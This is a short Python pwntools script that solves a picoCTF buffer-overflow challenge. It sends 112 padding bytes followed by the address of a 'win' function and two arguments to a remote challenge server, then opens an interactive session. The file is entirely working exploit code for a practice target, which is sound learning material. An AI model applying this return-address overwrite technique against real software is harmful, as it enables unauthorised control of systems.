import pwn
import time

elf = pwn.context.binary = pwn.ELF('./vuln')
#io = elf.process()
io = pwn.remote('saturn.picoctf.net',49210)
#pwn.gdb.attach(io)
#time.sleep(3)
#Payload
#Offset
#ROPGadget
#Set arg1, arg2 /EDI/ESI
#Call the function

offset = 112
retAddr = 0x08049009
popGadget = 0x08049451 #pop esi; pop edi; pop ebp; ret;
winAddr = elf.sym['win']
print(hex(winAddr))
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

payload = b"".join(
    [
        b'A'*offset,
        pwn.p32(winAddr),
        pwn.p32(0x0),
        pwn.p32(arg1),
        pwn.p32(arg2)
    ]
)

io.sendline(payload)
io.interactive()
